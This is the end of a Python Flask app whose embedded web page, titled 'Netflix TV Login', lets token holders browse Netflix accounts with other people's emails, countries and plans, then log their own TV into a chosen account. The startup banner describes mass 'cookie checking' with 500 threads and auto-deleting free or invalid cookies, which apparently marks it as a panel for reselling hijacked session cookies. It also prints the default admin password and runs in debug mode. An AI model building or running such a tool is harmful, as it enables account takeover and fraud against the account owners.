        .account-card:nth-child(3) { animation-delay: 0.3s; }
        .account-card:nth-child(4) { animation-delay: 0.4s; }
        .account-card:nth-child(5) { animation-delay: 0.5s; }
        .account-card:nth-child(6) { animation-delay: 0.6s; }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .account-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(229, 9, 20, 0.1), transparent);
            transition: left 0.5s;
        }
        
        .account-card:hover::before {
            left: 100%;
        }

        .account-card:hover {
            transform: translateY(-4px);
            border-color: rgba(229, 9, 20, 0.3);
            box-shadow: 0 20px 30px rgba(0, 0, 0, 0.4);
        }

        .account-card.selected {
            border-color: #E50914;
            background: rgba(229, 9, 20, 0.1);
            box-shadow: 0 0 30px rgba(229, 9, 20, 0.2);
        }

        .account-name {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            background: linear-gradient(135deg, #fff, #e0e0e0);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .account-detail {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            margin-bottom: 0.5rem;
            color: #d1d5db;
            font-size: 0.9rem;
        }

        .account-detail i {
            width: 20px;
            color: #E50914;
        }

        .account-profiles {
            margin-top: 1rem;
            padding-top: 1rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 0.9rem;
            color: #9ca3af;
        }

        /* TV Code Input */
        .tv-code-container {
            text-align: center;
            margin: 2rem 0;
            animation: scaleIn 0.5s ease;
        }

        .tv-code-input {
            width: 300px;
            padding: 1.5rem;
            font-size: 2rem;
            text-align: center;
            letter-spacing: 10px;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(229, 9, 20, 0.3);
            border-radius: 16px;
            color: #E50914;
            font-weight: 700;
            transition: all 0.3s;
        }

        .tv-code-input:focus {
            outline: none;
            border-color: #E50914;
            box-shadow: 0 0 20px rgba(229, 9, 20, 0.3);
            transform: scale(1.05);
        }

        /* Buttons */
        .btn {
            padding: 1rem 2rem;
            border-radius: 40px;
            font-weight: 600;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 1rem;
            position: relative;
            overflow: hidden;
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }

        .btn-primary {
            background: linear-gradient(135deg, #E50914, #b20710);
            color: white;
            box-shadow: 0 10px 20px rgba(229, 9, 20, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(229, 9, 20, 0.4);
        }
        
        .btn-primary:active {
            transform: translateY(0);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        /* Pagination */
        .pagination {
            display: flex;
            gap: 0.5rem;
            justify-content: center;
            margin: 2rem 0;
            animation: fadeIn 0.5s ease;
        }

        .page-btn {
            padding: 0.5rem 1rem;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            color: white;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .page-btn:hover {
            background: rgba(229, 9, 20, 0.2);
            border-color: #E50914;
            transform: translateY(-2px);
        }

        .page-btn.active {
            background: #E50914;
            border-color: #E50914;
        }

        /* Alerts */
        .alert {
            padding: 1rem;
            border-radius: 16px;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .alert-success { background: rgba(16, 185, 129, 0.15); color: #10b981; }
        .alert-error { background: rgba(239, 68, 68, 0.15); color: #ef4444; }
        .alert-info { background: rgba(59, 130, 246, 0.15); color: #3b82f6; }

        .hidden { display: none !important; }
        .text-center { text-align: center; }
        .mt-4 { margin-top: 1rem; }
        .mb-4 { margin-bottom: 1rem; }
        .flex { display: flex; }
        .gap-4 { gap: 1rem; }
        .justify-center { justify-content: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <i class="fab fa-netflix"></i>
                TV LOGIN
            </div>
        </div>

        <div class="main-card" id="mainCard">
            <!-- Step 1: Token Input -->
            <div id="step1Content">
                <div class="token-container">
                    <h2 style="margin-bottom: 1rem;">Enter Your Token</h2>
                    <input type="text" class="token-input" id="tokenInput" placeholder="XXXX-XXXX-XXXX-XXXX" maxlength="19">
                    <button class="btn btn-primary" onclick="validateToken()" style="width: 100%;">
                        <i class="fas fa-key"></i> Validate Token
                    </button>
                </div>
            </div>

            <!-- Step 2: Account Selection -->
            <div id="step2Content" class="hidden">
                <div class="text-center mb-4">
                    <span class="quality-badge" id="qualityBadge">UHD</span>
                    <h3 id="accountCount" style="margin-top: 0.5rem;">Loading accounts...</h3>
                </div>

                <div id="accountList" class="account-grid"></div>

                <div class="flex justify-center gap-4 mt-4">
                    <button class="btn btn-secondary" onclick="logout()">
                        <i class="fas fa-sign-out-alt"></i> Change Token
                    </button>
                    <button class="btn btn-primary" id="proceedBtn" onclick="proceedToCode()" disabled>
                        <i class="fas fa-arrow-right"></i> Continue
                    </button>
                </div>

                <div id="pagination" class="pagination"></div>
            </div>

            <!-- Step 3: TV Code -->
            <div id="step3Content" class="hidden">
                <div class="text-center">
                    <h2 style="margin-bottom: 1rem;">Enter TV Code</h2>
                    <p style="color: #9ca3af; margin-bottom: 2rem;">Enter the 8-digit code shown on your TV</p>
                    
                    <div class="tv-code-container">
                        <input type="text" class="tv-code-input" id="tvCode" maxlength="8" placeholder="········">
                    </div>

                    <div class="flex justify-center gap-4 mt-4">
                        <button class="btn btn-secondary" onclick="goBackToAccounts()">
                            <i class="fas fa-arrow-left"></i> Back
                        </button>
                        <button class="btn btn-primary" onclick="performLogin()">
                            <i class="fas fa-sign-in-alt"></i> Login
                        </button>
                    </div>
                </div>
            </div>

            <!-- Step 4: Success -->
            <div id="step4Content" class="hidden">
                <div class="text-center" style="padding: 3rem;">
                    <i class="fas fa-check-circle" style="font-size: 5rem; color: #10b981; margin-bottom: 1.5rem; animation: scaleIn 0.5s ease;"></i>
                    <h2 style="font-size: 2rem; margin-bottom: 1rem; animation: fadeIn 0.5s ease 0.2s both;">Login Successful!</h2>
                    <p style="color: #9ca3af; margin-bottom: 2rem; animation: fadeIn 0.5s ease 0.3s both;">Your TV is now connected to Netflix</p>
                    <button class="btn btn-primary" onclick="startNew()" style="animation: fadeIn 0.5s ease 0.4s both;">
                        <i class="fas fa-redo"></i> New Login
                    </button>
                </div>
            </div>

            <!-- Alerts -->
            <div id="alertContainer" class="mt-4"></div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        let selectedAccount = null;
        let currentPage = 1;
        let totalPages = 1;
        let currentQuality = '';

        function showAlert(type, message, timeout = 5000) {
            const container = document.getElementById('alertContainer');
            const alert = document.createElement('div');
            alert.className = `alert alert-${type}`;
            alert.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
            container.innerHTML = '';
            container.appendChild(alert);
            if (timeout > 0) setTimeout(() => alert.remove(), timeout);
        }

        function updateSteps() {
            for (let i = 1; i <= 4; i++) {
                const content = document.getElementById(`step${i}Content`);
                if (i === currentStep) {
                    content.classList.remove('hidden');
                } else {
                    content.classList.add('hidden');
                }
            }
        }

        async function validateToken() {
            const token = document.getElementById('tokenInput').value.trim().toUpperCase();
            
            if (!token || token.length < 16) {
                showAlert('error', 'Please enter a valid token');
                return;
            }

            try {
                const response = await fetch('/api/validate-token', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({token})
                });

                const data = await response.json();

                if (data.success) {
                    currentQuality = data.quality;
                    const badge = document.getElementById('qualityBadge');
                    badge.textContent = currentQuality;
                    badge.className = `quality-badge ${currentQuality.toLowerCase()}`;
                    
                    currentStep = 2;
                    updateSteps();
                    loadAccounts(1);
                    showAlert('success', `✅ Token validated! Quality: ${currentQuality} (${data.available} available)`);
                } else {
                    showAlert('error', data.error);
                }
            } catch (error) {
                showAlert('error', 'Validation failed');
            }
        }

        async function loadAccounts(page) {
            currentPage = page;
            
            try {
                const response = await fetch(`/api/user/accounts?page=${page}`);
                const data = await response.json();

                if (data.success) {
                    document.getElementById('accountCount').textContent = 
                        `Showing ${data.accounts.length} of ${data.total} ${data.quality} accounts`;
                    
                    totalPages = data.pages;
                    displayAccounts(data.accounts);
                    displayPagination();
                }
            } catch (error) {
                showAlert('error', 'Failed to load accounts');
            }
        }

        function displayAccounts(accounts) {
            const container = document.getElementById('accountList');
            container.innerHTML = '';

            accounts.forEach((account, index) => {
                const card = document.createElement('div');
                card.className = `account-card ${index === 0 ? 'selected' : ''}`;
                card.onclick = () => selectAccount(account);
                
                card.innerHTML = `
                    <div class="account-name">${account.name || 'Netflix Account'}</div>
                    <div class="account-detail">
                        <i class="fas fa-envelope"></i>
                        <span>${account.email || 'No email'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-globe"></i>
                        <span>${account.country || 'Unknown'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-tag"></i>
                        <span>${account.plan || 'Unknown'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-video"></i>
                        <span>${account.video_quality || 'Unknown'}</span>
                    </div>
                    <div class="account-profiles">
                        <i class="fas fa-users"></i> ${account.connected_profiles || 0} profiles
                        ${account.profiles ? `<br><small>${account.profiles}</small>` : ''}
                    </div>
                `;
                
                container.appendChild(card);
            });

            // Select first account by default
            if (accounts.length > 0) {
                selectedAccount = accounts[0];
                document.getElementById('proceedBtn').disabled = false;
            }
        }

        function selectAccount(account) {
            document.querySelectorAll('.account-card').forEach(card => {
                card.classList.remove('selected');
            });
            event.currentTarget.classList.add('selected');
            selectedAccount = account;
            document.getElementById('proceedBtn').disabled = false;
        }

        function displayPagination() {
            let html = '';
            for (let i = 1; i <= totalPages; i++) {
                html += `<button class="page-btn ${i === currentPage ? 'active' : ''}" onclick="loadAccounts(${i})">${i}</button>`;
            }
            document.getElementById('pagination').innerHTML = html;
        }

        function proceedToCode() {
            if (!selectedAccount) return;
            currentStep = 3;
            updateSteps();
            document.getElementById('tvCode').focus();
        }

        function goBackToAccounts() {
            currentStep = 2;
            updateSteps();
        }

        async function performLogin() {
            const tvCode = document.getElementById('tvCode').value.trim();
            
            if (!tvCode || !/^\\d{8}$/.test(tvCode)) {
                showAlert('error', 'Please enter a valid 8-digit code');
                return;
            }

            try {
                const response = await fetch('/api/user/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        netflix_id: selectedAccount.netflix_id,
                        tv_code: tvCode
                    })
                });

                const data = await response.json();

                if (data.success) {
                    currentStep = 4;
                    updateSteps();
                    showAlert('success', '✅ Login successful!');
                } else {
                    showAlert('error', data.message || 'Login failed');
                }
            } catch (error) {
                showAlert('error', 'Login request failed');
            }
        }

        async function logout() {
            await fetch('/api/user/logout');
            selectedAccount = null;
            currentPage = 1;
            currentStep = 1;
            document.getElementById('tokenInput').value = '';
            document.getElementById('tvCode').value = '';
            updateSteps();
        }

        function startNew() {
            logout();
        }

        // Initialize
        updateSteps();

        // Auto-format token input
        document.getElementById('tokenInput').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
            let parts = [];
            for (let i = 0; i < value.length && i < 16; i += 4) {
                parts.push(value.substr(i, 4));
            }
            e.target.value = parts.join('-');
        });
    </script>
</body>
</html>
'''

# -------------------------------------------------------------------
# START
# -------------------------------------------------------------------

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    
    print("=" * 70)
    print("🎬 NETFLIX TV LOGIN - ADVANCED SYSTEM")
    print("=" * 70)
    print(f"🔥 Video Qualities: SD, HD720p, HD, UHD")
    print(f"🔥 Thread pool: 500 threads for cookie checking")
    print(f"🔥 MongoDB: {MONGO_URI}")
    print(f"🔥 Database: {MONGO_DB}")
    print(f"🔥 Auto cleanup: Running every hour")
    print("=" * 70)
    print(f"🚀 Admin URL: http://0.0.0.0:{port}/admin/login")
    print(f"👤 Default Admin: admin / admin123")
    print(f"🚀 User URL: http://0.0.0.0:{port}")
    print("=" * 70)
    print("📦 New Features:")
    print("  • Real-time progress with dynamic stats")
    print("  • Total, Checked, Premium, Free counters")
    print("  • SD/HD720p/HD/UHD quality counters")
    print("  • Cancel button to stop checking")
    print("  • Auto-delete invalid/free cookies")
    print("  • Save results to database button")
    print("  • 500ms polling for smooth updates")
    print("=" * 70)
    
    app.run(host="0.0.0.0", port=port, debug=True, threaded=True)
